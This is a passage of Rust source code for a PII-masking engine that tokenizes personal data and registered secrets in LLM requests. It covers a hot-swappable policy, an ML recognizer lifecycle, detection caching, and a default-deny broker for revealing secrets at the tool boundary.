//! zlauder-engine — reversible PII masking for LLM traffic.
//!
//! Detection is delegated to `presidio-rs` (offline regex recognizers); tokens are
//! minted deterministically (blake3, session salt) and stored reversibly
//! (AES-256-GCM, per-session key). The four-arrow [`Surface`] model decides mask
//! vs unmask. This crate is runtime-free (synchronous); the proxy calls it from
//! async handlers.

mod broker;
mod cache;
mod config;
mod detect;
mod error;
mod manifest;
#[cfg(any(feature = "ml", feature = "ml-http"))]
pub mod ml;
mod ml_api;
#[cfg(feature = "ml-http")]
mod ml_http;
mod recognizers;
mod secrets;
mod store;
mod surface;
mod token;

pub use config::{
    AllowList, Category, ComputePrecision, CustomReplacement, ENTITY_CVV, EngineConfig,
    ExposureRedactionScope, MlBackend, MlConfig, Operator, Profile, Quantization, RevealMarker,
    SaltScope,
};
pub use error::EngineError;
pub use ml_api::{InfallibleMl, MlRecognizer};
pub use broker::{
    BrokerAllow, BrokerDecision, BrokerPolicy, DenyReason, DestRule, RESERVED_NONDEREF_SECRET,
};
pub use manifest::{ManifestEntry, MaskOutcome, MaskStats, UnmaskManifest};
pub use secrets::{SecretRule, SecretValue};
pub use store::{Revealed, TokenKind};
pub use surface::{Direction, Surface};
pub use token::{
    BROKER_PREFIX, MAX_TOKEN_LEN, TOKEN_HASH_HEX_LEN, is_broker_token, make_token, slugify,
    token_regex,
};

/// Outcome of a class-aware AUDIT reveal ([`MaskEngine::reveal_audit`]): distinguishes a
/// genuinely unknown handle from one that EXISTS but is not revealable on the audit path, so
/// the operator-facing reveal can explain WHY — without ever returning a broker secret value.
#[derive(Clone, Debug)]
pub enum RevealAudit {
    /// A PII token, resolved to its plaintext (reversible, display-revealable).
    Pii(String),
    /// A `Local` ("owner-reveal") token, resolved to its plaintext (the display path reveals
    /// `Local`, and the audit endpoint is key-gated to the operator).
    Local(String),
    /// A registered broker secret: it exists, but its value is resolved ONLY at the tool
    /// boundary and is NEVER revealable here. Carries the registered NAME (not the value).
    Broker { secret_name: Option<String> },
    /// No live token by that handle — unknown, expired, or tombstoned.
    Unknown,
}

use std::borrow::Cow;
use std::sync::{Arc, Mutex, RwLock};

use cache::{CacheKey, CachedDetection, DetectionCache, hash_text};
use detect::{
    CompiledCustom, compile_customs, resolve_operator, resolve_overlaps, run_detection,
    run_detection_batch,
};
use secrets::{CompiledSecret, SecretSet, compile_secrets, detect_secrets, secrets_fingerprint};
use store::SessionStore;
use token::{hash_value, make_hash_token};

/// The masking *policy*: the config, its compiled custom rules, and a precomputed
/// fingerprint of every detection-affecting input. Stored as an immutable
/// `Arc<Policy>` behind an `RwLock` so the proxy can hot-swap it (e.g. a `/privacy`
/// toggle) without dropping the session store — token determinism (and the
/// prompt-cache prefix) survives a config change. `mask()` clones the `Arc` under a
/// brief lock and runs detection/apply against the snapshot, so a slow inference or
/// Ready-rescan never holds the lock and never starves a live `set_config` (audit
/// #2).
#[derive(Clone)]
struct Policy {
    config: EngineConfig,
    customs: Vec<CompiledCustom>,
    /// Fingerprint of all detection-affecting config (see
    /// [`EngineConfig::detection_fingerprint`]); folded into the cache key.
    policy_fp: u64,
}

impl Policy {
    fn new(mut config: EngineConfig) -> Result<Self, EngineError> {
        // Detection failures are never allowed to pass plaintext upstream. Keep the
        // old config field parseable for compatibility, but do not let persisted
        // `fail_closed = false` or stale control-plane clients weaken the policy.
        config.fail_closed = true;
        // `Operator::Broker` and `Operator::Local` are reachable ONLY via a registered
        // secret (they need a secret name); reject them in the serialized PII operator
        // surface so they can never appear in `WireConfig`/`GET /zlauder/config`. (Local
        // is also `#[serde(skip)]`, so this is belt-and-suspenders for a programmatic
        // config; the message stays specific to what a user can actually type.)
        let bad_op = |op: &Operator| *op == Operator::Broker || *op == Operator::Local;
        if bad_op(&config.default_operator) || config.entity_operators.values().any(bad_op) {
            return Err(EngineError::InvalidSecret(
                "Operator::Broker/Local is only valid for a registered secret, \
                 not default_operator/entity_operators"
                    .into(),
            ));
        }
        let customs = compile_customs(&config.custom_replacements)?;
        let policy_fp = config.detection_fingerprint();
        Ok(Self {
            config,
            customs,
            policy_fp,
        })
    }
}

/// Lifecycle of the optional ML recognizer (`openai/privacy-filter`). The proxy
/// loads the model in the *background*; this is what the status line and
/// `/zlauder:privacy status` report. While `Loading`, masking keeps running
/// regex-only — outbound text is NOT yet filtered through the ML model.
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq, serde::Serialize)]
#[serde(rename_all = "snake_case")]
pub enum MlStatus {
    /// Not requested (or turned off live).
    #[default]
    Disabled,
    /// Requested; the model is downloading/loading. Masking is regex-only.
    Loading,
    /// Loaded and active.
    Ready,
    /// A load attempt failed (see the snapshot's error).
    Failed,
}

/// The live ML slot: status + the loaded recognizer, plus a generation counter
/// that makes stale background loads safe to discard.
struct MlRuntime {
    status: MlStatus,
    recognizer: Option<Arc<dyn ml_api::MlRecognizer>>,
    error: Option<String>,
    /// Most recent post-`Ready` recognizer failure. Status stays `Ready` so a
    /// transient backend error cannot drop ML coverage to regex-only.
    last_runtime_error: Option<String>,
    /// Runtime recognizer failures since this recognizer became `Ready`.
    runtime_failures: u64,
    /// Params of the load that is desired / in-flight / loaded, so a reconcile can
    /// tell whether a config change requires rebuilding the recognizer.
    desired: Option<MlConfig>,
    /// Bumped by every [`MaskEngine::ml_begin_load`] / [`MaskEngine::ml_disable`].
    /// A load task captures the generation at begin and only installs its result
    /// if it still matches — so a load that finishes AFTER an off / model-change
    /// can't resurrect a recognizer contrary to current config.
    generation: u64,
    /// Precomputed fingerprint of the ACTIVE ML recognizer identity (present?,
    /// model, revision, min_score), folded into the cache key. Recomputed by every
    /// mutator so it stays consistent with `status`/`recognizer`/`desired`, and read
    /// together with the recognizer under one `ml.read()` (audit #1). When the
    /// recognizer flips `Ready`, this changes → the whole transcript re-detects with
    /// ML coverage (the intended rescan).
    ml_fp: u64,
}

impl Default for MlRuntime {
    fn default() -> Self {
        let mut rt = Self {
            status: MlStatus::Disabled,
            recognizer: None,
            error: None,
            last_runtime_error: None,
            runtime_failures: 0,
            desired: None,
            generation: 0,
            ml_fp: 0,
        };
        rt.ml_fp = compute_ml_fp(&rt);
        rt
    }
}

/// Fingerprint of the active ML recognizer identity. Only a `Ready` recognizer
/// contributes its params; every non-active state shares the single "no ML" key
/// space (so regex-only results computed while `Loading`/`Disabled` are reused
/// across those states and abandoned the instant ML becomes `Ready`).
fn compute_ml_fp(rt: &MlRuntime) -> u64 {
    let mut h = blake3::Hasher::new();
    h.update(b"zlauder-ml-fp-v1");
    if rt.status == MlStatus::Ready && rt.recognizer.is_some() {
        h.update(&[1]);
        if let Some(d) = &rt.desired {
            h.update(&[d.backend.fp_tag()]);
            match d.min_score {
                Some(s) => {
                    h.update(&[1]);
                    h.update(&s.to_bits().to_le_bytes());
                }
                None => {
                    h.update(&[0]);
                }
            };
            match d.backend {
                crate::config::MlBackend::Local => {
                    h.update(d.model.as_bytes());
                    h.update(&[0]);
                    match &d.revision {
                        Some(r) => {
                            h.update(&[1]);
                            h.update(r.as_bytes());
                        }
                        None => h.update(&[0]),
                    };
                    h.update(&[d.prefer_gpu as u8]);
                    h.update(&[d.compute_precision.fp_tag()]);
                    h.update(&[d.quant.fp_tag()]);
                    h.update(&[d.banded_attention as u8]);
                }
                crate::config::MlBackend::Http => {
                    match &d.endpoint {
                        Some(e) => {
                            h.update(&[1]);
                            h.update(e.as_bytes());
                        }
                        None => h.update(&[0]),
                    }
                    h.update(&[0]);
                    match &d.auth_token_env {
                        Some(v) => {
                            h.update(&[1]);
                            h.update(v.as_bytes());
                        }
                        None => h.update(&[0]),
                    }
                }
            };
        }
    } else {
        h.update(&[0]);
    }
    u64::from_le_bytes(
        h.finalize().as_bytes()[..8]
            .try_into()
            .expect("32-byte digest"),
    )
}

/// Public snapshot of the ML slot for status reporting.
#[derive(Clone, Debug)]
pub struct MlSnapshot {
    pub status: MlStatus,
    pub error: Option<String>,
    /// Most recent post-`Ready` recognizer failure, if any.
    pub last_runtime_error: Option<String>,
    /// Runtime recognizer failures since this recognizer became `Ready`.
    pub runtime_failures: u64,
    /// The model params currently desired/loaded (`None` when disabled).
    pub desired: Option<MlConfig>,
}

/// The masking engine. Cheap to share behind an `Arc`; interior mutability via an
/// `RwLock` on the hot-swappable policy, an `RwLock` on the hot-swappable ML
/// recognizer slot, and a `Mutex` on the session store. The regex analyzer is
/// fixed at construction (a `language` change needs a rebuild); the ML recognizer
/// is loaded/dropped live.
pub struct MaskEngine {
    analyzer: presidio_analyzer::AnalyzerEngine,
    policy: RwLock<Arc<Policy>>,
    ml: RwLock<MlRuntime>,
    store: Mutex<SessionStore>,
    /// Content-addressed detection memoization (Component 1).
    cache: DetectionCache,
    /// Serializes ML inference per leaf (default max-inflight 1): CPU
    /// token-classification already saturates the cores, so concurrent inferences
    /// just thrash. A `std::sync::Mutex` because ML inference ONLY ever runs inside
    /// a `spawn_blocking` thread (the proxy guarantees it — invariant #5), so the
    /// synchronous acquire never blocks the async executor; it serializes
    /// blocking-pool threads, which is exactly the intent. Acquired per-inference
    /// (not per-walk) so a Ready-rescan can't freeze a second window (Component 2).
    ml_gate: Mutex<()>,
    /// Registered-secret channel (Pass-0 exact-literal detection), held OFF
    /// `EngineConfig` so values never serialize into `WireConfig`/`GET /config`/the
    /// monitor. Hot-swappable `Arc` like `policy`, so determinism survives a secret
    /// swap (already-minted broker tokens keep resolving).
    secrets: RwLock<Arc<SecretSet>>,
    /// Broker resolution policy (default-deny). Held OFF `EngineConfig` like
    /// `secrets`; consulted only at the tool-input boundary by
    /// [`MaskEngine::broker_resolve_pointers`]. Hot-swappable.
    broker_policy: RwLock<Arc<BrokerPolicy>>,
}

impl MaskEngine {
    /// Build the analyzer (offline regex recognizers) and a fresh random session.
    pub fn new(config: EngineConfig) -> Result<Self, EngineError> {
        Self::from_parts(config, SessionStore::new)
    }

    /// Build with an explicit session key + salt (proxy passes the SessionStart
    /// session bytes so token minting is stable for the whole session).
    pub fn with_session(
        config: EngineConfig,
        key: [u8; 32],
        salt: [u8; 16],
    ) -> Result<Self, EngineError> {
        Self::from_parts(config, move || SessionStore::with_key_and_salt(key, salt))
    }

    /// Build reusing only a `salt` (token determinism across a proxy restart) with
    /// a FRESH random encryption key. The proxy uses this so the on-disk state file
    /// never holds the AES key — the control token (see [`Self::control_token`]) is
    /// what gates the control plane, decoupling control access from decryption.
    pub fn with_salt(config: EngineConfig, salt: [u8; 16]) -> Result<Self, EngineError> {
        Self::from_parts(config, move || SessionStore::with_salt(salt))
    }

    /// Shared constructor: build the analyzer + policy + detection cache, deferring
    /// the (differently-seeded) session store to `make_store`.
    fn from_parts(
        config: EngineConfig,
        make_store: impl FnOnce() -> SessionStore,
    ) -> Result<Self, EngineError> {
        // Wire the context-aware enhancer: a recognizer's context words (e.g.
        // PHONE_NUMBER's "call"/"phone"/"number") boost a nearby match's score.
        // Without it, low-confidence-by-design recognizers (phones score 0.4) never
        // clear the 0.5 floor. `run_detection` feeds it lightweight NLP artifacts and
        // pre-filters below the boost band so a boostable candidate survives to be
        // enhanced (presidio filters before enhancing — see detect.rs).
        let mut analyzer = presidio_analyzer::default_analyzer(&config.language)
            .with_context_enhancer(presidio_analyzer::LemmaContextAwareEnhancer::new());
        // zlauder-local hard-context, value-only-capture recognizers (the three PII
        // misses whose value shape is ambiguous in code/log traffic). They impl
        // `Recognizer` directly over a raw regex and emit `Custom(...)` entities that
        // the category gate (config.rs) now enables under Identity/Financial. Run in
        // Pass 2 → `ingest_results`, so they share the gate/allow-list/overlap path.
        analyzer.add_recognizer(Arc::new(recognizers::DateOfBirthRecognizer::new()));
        analyzer.add_recognizer(Arc::new(recognizers::CardExpiryRecognizer::new()));
        analyzer.add_recognizer(Arc::new(recognizers::CvvRecognizer::new()));
        // Context-based in-URL/config credential recognizer → URL_CREDENTIAL (Secrets).
        // Stays effective when `Network` (the URL entity) is off — design §3.
        analyzer.add_recognizer(Arc::new(recognizers::UrlCredentialRecognizer::new()));
        let cache_cap = config.detection_cache_cap;
        let policy = Policy::new(config)?;
        Ok(Self {
            analyzer,
            policy: RwLock::new(Arc::new(policy)),
            ml: RwLock::new(MlRuntime::default()),
            store: Mutex::new(make_store()),
            cache: DetectionCache::new(cache_cap),
            ml_gate: Mutex::new(()),
            secrets: RwLock::new(Arc::new(SecretSet::empty())),
            broker_policy: RwLock::new(Arc::new(BrokerPolicy::default())),
        })
    }

    /// A control token derived from — but not revealing — the session key, used as
    /// the `x-zlauder-key` for the control/reveal plane. It is `blake3` of the key
    /// under a distinct domain, so leaking it (e.g. via the state file) grants
    /// control-plane access but NOT offline decryption of the transcript.
    pub fn control_token(&self) -> String {
        let store = self.store.lock().expect("store mutex poisoned");
        let mut h = blake3::Hasher::new();
        h.update(b"zlauder-control-token-v1");
        h.update(store.key());
        h.finalize().to_hex().to_string()
    }

    /// A clone of the current effective config (snapshot; not a live view).
    pub fn config_snapshot(&self) -> EngineConfig {
        self.policy
            .read()
            .expect("policy rwlock poisoned")
            .config
            .clone()
    }

    /// Whether masking is currently on (the config `enabled` master switch).
    pub fn is_enabled(&self) -> bool {
        self.policy
            .read()
            .expect("policy rwlock poisoned")
            .config
            .enabled
    }

    /// Flip the master switch live. `enabled` is NOT part of `policy_fp` (the
    /// disabled path is an un-cached early return), so the cache survives the toggle
    /// and determinism holds. Cheap: clones the small policy to swap one bool.
    pub fn set_enabled(&self, enabled: bool) {
        let mut slot = self.policy.write().expect("policy rwlock poisoned");
        if slot.config.enabled == enabled {
            return;
        }
        let mut next = (**slot).clone();
        next.config.enabled = enabled;
        *slot = Arc::new(next);
    }

    /// Hot-swap the whole policy. Recompiles custom rules and recomputes
    /// `policy_fp`; the session store (key/salt/minted tokens) is untouched, so
    /// already-minted tokens keep resolving and determinism is preserved across the
    /// swap. The detection cache is NOT flushed — any detection-affecting change
    /// moves `policy_fp`, so stale entries become unreachable and age out via LRU
    /// (fingerprint invalidation, not a flush). The cache cap is applied live. A
    /// change to `config.language` does NOT rebuild the analyzer — that needs a
    /// restart.
    pub fn set_config(&self, config: EngineConfig) -> Result<(), EngineError> {
        let cache_cap = config.detection_cache_cap;
        let policy = Policy::new(config)?;
        {
            let mut slot = self.policy.write().expect("policy rwlock poisoned");
            *slot = Arc::new(policy);
        }
        // Live cap (audit #10): `0` clears + disables the cache without a restart.
        // NOTE: `set_config` deliberately leaves the separate `secrets` slot
        // untouched — secrets are reinstalled via `set_secret_rules`, never carried
        // on `EngineConfig`.
        self.cache.set_cap(cache_cap);
        Ok(())
    }

    /// Install (hot-swap) the registered-secret set. Recompiles matchers and
    /// recomputes `secrets_fp`; the session store is untouched EXCEPT that each `Local`
    /// ("owner-reveal") secret's token is eagerly interned now (so the monitor capture seed
    /// is populated from install — see the loop below), and already-minted broker/local
    /// tokens keep resolving. A registration error (invalid operator, empty value,
    /// broker slug collision) leaves the previous set in place. Registering/rotating
    /// moves `secrets_fp` → a fresh cache key space (stale detections age out by LRU).
    pub fn set_secret_rules(&self, rules: Vec<SecretRule>) -> Result<(), EngineError> {
        let compiled = compile_secrets(rules)?;
        let secrets_fp = secrets_fingerprint(&compiled);
        // Eagerly intern each LOCAL ("owner-reveal") secret's token NOW, at install — so its
        // deterministic handle exists in the store BEFORE the first masking turn. The monitor
        // seeds its capture-scrub set from the store (`local_redaction_pairs`); without this
        // eager intern that seed would be EMPTY until the first admin-key masking turn (tokens
        // are otherwise minted lazily by `mask()`), and a cross-turn reveal in the gap could
        // persist the admin key unmasked. `intern_local` is mint-or-reuse + deterministic and
        // keys off the secret `name` exactly as `mask()` does (`d.entity_type == name`), so the
        // install handle equals the masked handle; the REPLACE re-install is an idempotent no-op.
        for c in &compiled {
            if c.operator == Operator::Local {
                self.store
                    .lock()
                    .expect("store mutex poisoned")
                    .intern_local(&c.name, c.value())?;
            }
        }
        let set = SecretSet {
            compiled,
            secrets_fp,
        };
        let mut slot = self.secrets.write().expect("secrets rwlock poisoned");
        *slot = Arc::new(set);
        Ok(())
    }

    /// Number of registered secrets currently installed.
    pub fn secret_count(&self) -> usize {
        self.secrets
            .read()
            .expect("secrets rwlock poisoned")
            .compiled
            .len()
    }

    /// Install (hot-swap) the broker policy (default-deny base + allow rules).
    pub fn set_broker_policy(&self, policy: BrokerPolicy) {
        let mut slot = self
            .broker_policy
            .write()
            .expect("broker_policy rwlock poisoned");
        *slot = Arc::new(policy);
    }

    /// Resolve broker tokens in a tool-input JSON value at the LOCAL tool boundary
    /// (T2/T3), gated by the broker policy. Walks every string leaf (tracking its
    /// RFC-6901 pointer); for each `[BROKER__…]` token it reveals the value + the
    /// registered secret name from the store and asks the policy whether it may
    /// resolve into `(secret, tool, pointer, leaf)`. Allowed tokens are spliced to
    /// their real value IN PLACE; denied / unknown ones are left tokenized. PII tokens
    /// are untouched (PII is resolved earlier, on the wire). Returns a report
    /// (resolved count + per-pointer denials) — never the values.
    pub fn broker_resolve_pointers(
        &self,
        tool: &str,
        input: &mut serde_json::Value,
    ) -> BrokerResolveReport {
        let policy = Arc::clone(
            &self
                .broker_policy
                .read()
                .expect("broker_policy rwlock poisoned"),
        );
        let store = self.store.lock().expect("store mutex poisoned");
        let mut report = BrokerResolveReport::default();
        let mut pointer = String::new();
        broker_walk(input, &mut pointer, tool, &policy, &store, &mut report);
        report
    }

    /// Number of distinct tokens minted so far this session.
    pub fn token_count(&self) -> usize {
        self.store.lock().expect("store mutex poisoned").len()
    }

    // --- ML recognizer slot (hot-loaded in the background by the proxy) -------

    /// Begin (or restart) a background load for `desired`. Bumps the generation
    /// (invalidating any in-flight load), sets [`MlStatus::Loading`], and returns
    /// the new generation token the caller passes back to [`Self::ml_set_ready`] /
    /// [`Self::ml_set_failed`].
    pub fn ml_begin_load(&self, desired: MlConfig) -> u64 {
        let mut ml = self.ml.write().expect("ml rwlock poisoned");
        ml.generation += 1;
        ml.status = MlStatus::Loading;
        ml.recognizer = None;
        ml.error = None;
        ml.last_runtime_error = None;
        ml.runtime_failures = 0;
        ml.desired = Some(desired);
        ml.ml_fp = compute_ml_fp(&ml);
        ml.generation
    }

    /// Install a freshly-loaded recognizer — but ONLY if `generation` is still
    /// current (else the load was superseded by an off / model-change and is
    /// dropped).
    pub fn ml_set_ready(&self, generation: u64, recognizer: Arc<dyn ml_api::MlRecognizer>) {
        let mut ml = self.ml.write().expect("ml rwlock poisoned");
        if ml.generation != generation {
            return;
        }
        ml.status = MlStatus::Ready;
        ml.recognizer = Some(recognizer);
        ml.error = None;
        ml.last_runtime_error = None;
        ml.runtime_failures = 0;
        ml.ml_fp = compute_ml_fp(&ml);
    }

    /// Record a failed load — ONLY if `generation` is still current.
    pub fn ml_set_failed(&self, generation: u64, error: String) {
        let mut ml = self.ml.write().expect("ml rwlock poisoned");
        if ml.generation != generation {
            return;
        }
        ml.status = MlStatus::Failed;
        ml.recognizer = None;
        ml.error = Some(error);
        ml.ml_fp = compute_ml_fp(&ml);
    }

    /// Turn ML off live: invalidate any in-flight load (bump generation) and drop
    /// the recognizer, so it stops affecting detection immediately.
    pub fn ml_disable(&self) {
        let mut ml = self.ml.write().expect("ml rwlock poisoned");
        ml.generation += 1;
        ml.status = MlStatus::Disabled;
        ml.recognizer = None;
        ml.error = None;
        ml.last_runtime_error = None;
        ml.runtime_failures = 0;
        ml.desired = None;
        ml.ml_fp = compute_ml_fp(&ml);
    }

    /// Apply a `required` policy flip live without reloading the recognizer.
    /// `ml_for_mask` reads it on every request.
    pub fn ml_update_required(&self, required: bool) {
        let mut ml = self.ml.write().expect("ml rwlock poisoned");
        if let Some(d) = &mut ml.desired {
            d.required = required;
        }
    }

    /// Snapshot the ML slot (status + last error + desired params) for reporting.
    pub fn ml_snapshot(&self) -> MlSnapshot {
        let ml = self.ml.read().expect("ml rwlock poisoned");
        MlSnapshot {
            status: ml.status,
            error: ml.error.clone(),
            last_runtime_error: ml.last_runtime_error.clone(),
            runtime_failures: ml.runtime_failures,
            desired: ml.desired.clone(),
        }
    }

    /// Whether ML inference is currently live (model `Ready`). Cheap.
    pub fn ml_active(&self) -> bool {
        self.ml.read().expect("ml rwlock poisoned").status == MlStatus::Ready
    }

    /// Whether the proxy should offload the mask walk to a blocking thread: true
    /// when a model is `Ready` OR `Loading`. Offloading while `Loading` is now cheap
    /// (no inference runs yet, so the per-inference `ml_gate` is never taken) and it
    /// CLOSES the `Loading -> Ready` race where inference could otherwise flip live
    /// mid-walk and run inline on the async executor thread (which would also acquire
    /// the std `ml_gate` off a blocking thread). The only residual inline edge is the
    /// rarer, user-initiated `Disabled -> Loading` flip, bounded to one request.
    pub fn ml_should_offload(&self) -> bool {
        matches!(
            self.ml.read().expect("ml rwlock poisoned").status,
            MlStatus::Loading | MlStatus::Ready
        )
    }

    /// Snapshot the recognizer, cache fingerprint, generation, and required-mode
    /// refusal under one read lock so transitions cannot tear. Required-mode
    /// refusal is returned before cache lookup to avoid serving regex-only results.
    fn ml_for_mask(
        &self,
    ) -> (
        Option<Arc<dyn ml_api::MlRecognizer>>,
        u64,
        u64,
        Option<String>,
    ) {
        let ml = self.ml.read().expect("ml rwlock poisoned");
        let rec = if ml.status == MlStatus::Ready {
            ml.recognizer.clone()
        } else {
            None
        };
        let refusal = match &ml.desired {
            Some(d) if d.enabled && d.required && ml.status != MlStatus::Ready => Some(format!(
                "ml required but not ready (status: {:?}{}) — refusing to send text with \
                 regex-only scanning",
                ml.status,
                ml.error
                    .as_deref()
                    .map(|e| format!(", load error: {e}"))
                    .unwrap_or_default()
            )),
            _ => None,
        };
        (rec, ml.ml_fp, ml.generation, refusal)
    }

    /// Record a post-`Ready` recognizer failure without demoting status; demotion
    /// would drop ML coverage to regex-only. Stale generations are ignored.
    fn ml_note_runtime_failure(&self, generation: u64, msg: &str) {
        let mut ml = self.ml.write().expect("ml rwlock poisoned");
        if ml.generation != generation {
            return;
        }
        ml.runtime_failures += 1;
        ml.last_runtime_error = Some(msg.to_string());
    }

    /// Clear the runtime-failure note after a successful same-generation ML call.
    fn ml_clear_runtime_failure(&self, generation: u64) {
        {
            let ml = self.ml.read().expect("ml rwlock poisoned");
            if ml.generation != generation || ml.last_runtime_error.is_none() {
                return;
            }
        }
        let mut ml = self.ml.write().expect("ml rwlock poisoned");
        if ml.generation == generation {
            ml.last_runtime_error = None;
        }
    }

    /// Mask `text` (request path). Detect -> filter -> mint tokens -> splice.
    ///
    /// `surface` is a policy/audit label, not a direction gate: under
    /// unmask-on-the-wire the proxy masks every outbound field (including
    /// assistant-authored history, which the local transcript stores as
    /// plaintext) and unmasks every inbound field. Determinism makes the
    /// round-trip reproduce the original token form exactly.
    pub fn mask(&self, text: &str, surface: Surface) -> Result<MaskOutcome, EngineError> {
        if surface == Surface::UserMessage
            && let Some(outcome) = self.mask_user_bypass(text)?
        {
            return Ok(outcome);
        }

        // Snapshot the policy as a cheap `Arc` clone, then RELEASE the lock before
        // any detection/inference/apply work (audit #2): a slow miss or Ready-rescan
        // must never hold a read lock that could starve a live `set_config` write.
        let policy = Arc::clone(&self.policy.read().expect("policy rwlock poisoned"));
        // Snapshot the registered-secret set (cheap `Arc` clone) alongside the policy.
        let secrets = Arc::clone(&self.secrets.read().expect("secrets rwlock poisoned"));

        // Master switch off, or this surface disabled by policy → transparent
        // passthrough on the mask path (unmask still runs on the response side). This
        // early return is NOT cached (so `enabled`/`disabled_surfaces` need not be in
        // `policy_fp`). EXCEPTION (A9): a registered secret is NOT subject to the
        // convenience disable — it is still masked even on a disabled surface, so a
        // known secret value can never egress in plaintext via the fast path.
        if !policy.config.enabled || !policy.config.surface_enabled(surface) {
            if secrets.compiled.is_empty() {
                return Ok(MaskOutcome::passthrough(text, MaskStats::disabled()));
            }
            // Resolve overlaps among registered secrets (two secrets can match
            // overlapping spans) so `apply()` never splices overlapping ranges.
            let dets = resolve_overlaps(detect_secrets(&secrets.compiled, text, surface));
            if dets.is_empty() {
                return Ok(MaskOutcome::passthrough(text, MaskStats::disabled()));
            }
            let (out, manifest) = self.apply(text, surface, &policy.config, &dets)?;
            return Ok(MaskOutcome {
                masked_text: out,
                manifest,
                stats: MaskStats::disabled(),
            });
        }

        // Peel a prior turn's reveal-marker decoration off re-sent assistant history
        // BEFORE anything else (detection, hashing, splicing). Claude Code stores the
        // un-masked (and, with the marker on, wrapped) reply in the transcript and
        // re-sends it as `AssistantText`; stripping the exact marker literals here
        // makes detection see the original value (no marker byte fused to the PII) and
        // makes the re-minted token byte-identical to a no-marker round-trip — so the
        // decoration adds zero noise upstream and keeps the prompt-cache prefix stable.
        // Cheap-guarded so a marker-free leaf never allocates; keyed on the cleaned
        // text below, so a marker change can't serve a stale entry. Shared with
        // `prewarm_batch` so both derive the SAME key for the same leaf.
        let stripped = stripped_for_key(&policy, text, surface);
        let text: &str = stripped.as_ref();

        // Snapshot the ML recognizer + its fingerprint + slot generation together
        // (atomic across an ML transition). `None` while loading/disabled ⇒
        // regex-only key space. The generation tags any runtime success/failure
        // back to THIS recognizer so a slow result can't mark a reloaded slot.
        let (ml, ml_fp, ml_generation, refusal) = self.ml_for_mask();
        // Strict mode (`[engine.ml] required = true`): ML is enabled but not
        // `Ready` ⇒ refuse BEFORE the cache lookup (the regex-only key space
        // below would otherwise happily serve detections without ML coverage).
        if let Some(reason) = refusal {
            tracing::warn!("refusing request: {reason}");
            return Err(EngineError::Ml(reason));
        }
        let key = CacheKey {
            text_hash: hash_text(text),
            surface,
            policy_fp: policy.policy_fp,
            ml_fp,
            secrets_fp: secrets.secrets_fp,
        };

        let mut stats = MaskStats {
            leaves: 1,
            ..Default::default()
        };

        // Resolve the detection list: cache hit, or a miss that runs detection.
        let dets: Arc<Vec<CachedDetection>> = match self.cache.get(&key) {
            Some(hit) => {
                stats.hit = 1;
                hit
            }
            None if ml.is_some() => {
                // ML miss: serialize inference through the engine gate (held only on
                // a `spawn_blocking` thread per invariant #5), and RE-CHECK the cache
                // under it so concurrent same-leaf misses single-flight (audit #6).
                // The gate guards a unit `()` (pure serialization, no protected data),
                // so we RECOVER a poisoned guard rather than propagate: a panic inside
                // a single ML inference must not permanently wedge all future masking.
                let _gate = self
                    .ml_gate
                    .lock()
                    .unwrap_or_else(std::sync::PoisonError::into_inner);
                match self.cache.get(&key) {
                    Some(hit) => {
                        stats.hit = 1;
                        hit
                    }
                    None => self.detect_and_cache(
                        &policy,
                        &secrets.compiled,
                        ml.as_deref(),
                        ml_generation,
                        text,
                        surface,
                        key,
                        &mut stats,
                    )?,
                }
            }
            None => self.detect_and_cache(
                &policy,
                &secrets.compiled,
                None,
                ml_generation,
                text,
                surface,
                key,
                &mut stats,
            )?,
        };

        // Apply loop — runs EVERY call (hit or miss): resolve operators from the LIVE
        // policy snapshot, slice plaintext from the LIVE text, mint/redact, and
        // rebuild the per-call manifest. The replay is REQUIRED, not just for stats:
        // custom literal tokens unmask only via this manifest, so the masked string
        // cannot itself be cached.
        let (out, manifest) = self.apply(text, surface, &policy.config, &dets)?;

        Ok(MaskOutcome {
            masked_text: out,
            manifest,
            stats,
        })
    }

    /// Splice detections into `text` (back-to-front so byte offsets stay valid),
    /// minting tokens / rendering operators and building the per-call manifest.
    /// Shared by the normal mask path, the secrets-only disabled-surface path, and
    /// the user-bypass secret scan.
    fn apply(
        &self,
        text: &str,
        surface: Surface,
        cfg: &EngineConfig,
        dets: &[CachedDetection],
    ) -> Result<(String, UnmaskManifest), EngineError> {
        let mut manifest = UnmaskManifest::new();
        let mut out = text.to_string();
        // One salt grab for the salted `Hash` render of registered secrets.
        let salt = *self.store.lock().expect("store mutex poisoned").salt();
        for d in dets.iter().rev() {
            // Detector offsets are char-aligned in practice (regex over `&str`), but
            // if one ever isn't, `&text[start..end]` would panic and poison the store
            // mutex — wedging the proxy while /healthz still says "ok". Snap OUTWARD
            // to char boundaries instead: we still mask the span (fail SAFE — never
            // panic, and never leave it as plaintext, which skipping the span would).
            let (start, end) = snap_to_char_boundary(text, d.start, d.end);
            let slice = &text[start..end];
            let replacement = match resolve_operator(cfg, d) {
                Operator::Keep => continue,
                Operator::Redact => "[REDACTED]".to_string(),
                Operator::Mask { char, from_end } => mask_value(slice, char, from_end),
                Operator::Hash => {
                    // Registered secrets get the SALTED colon-form render (defeats the
                    // cross-project confirmation oracle); auto-PII Hash stays bare.
                    if d.secret_op.is_some() {
                        make_hash_token(&d.entity_type, slice, &salt)
                    } else {
                        hash_value(&d.entity_type, slice)
                    }
                }
                Operator::Token => {
                    let token = {
                        let mut store = self.store.lock().expect("store mutex poisoned");
                        if let Some(fixed) = &d.fixed_token {
                            store.intern_fixed(fixed.clone(), slice)?;
                            fixed.clone()
                        } else {
                            store.intern(&d.entity_type, slice)?
                        }
                    };
                    manifest.push(ManifestEntry {
                        canonical_form: slice.to_string(),
                        token_handle: token.clone(),
                        entity_kind: d.entity_type.clone(),
                        arrow_origin: surface,
                        exposed_at: Some(start..start + token.len()),
                        broker: false,
                        local: false,
                    });
                    token
                }
                Operator::Local => {
                    // Owner-reveal: reversible token (standard grammar, so the display
                    // unmask resolves it), but `local: true` ⇒ the tool-input unmask
                    // refuses it unless the handle is promoted. Reachable only via a
                    // registered secret (the proxy admin key).
                    let token = {
                        let mut store = self.store.lock().expect("store mutex poisoned");
                        store.intern_local(&d.entity_type, slice)?
                    };
                    manifest.push(ManifestEntry {
                        canonical_form: slice.to_string(),
                        token_handle: token.clone(),
                        entity_kind: d.entity_type.clone(),
                        arrow_origin: surface,
                        exposed_at: Some(start..start + token.len()),
                        broker: false,
                        local: true,
                    });
                    token
                }
                Operator::Broker => {
                    // `entity_type` is the EXACT registered secret name (the policy
                    // authority); `intern_broker` slugifies it for the token entity and
                    // stores the verbatim name on the entry. Resolvable only at the
                    // tool-input boundary (Phase-4) — refused on display.
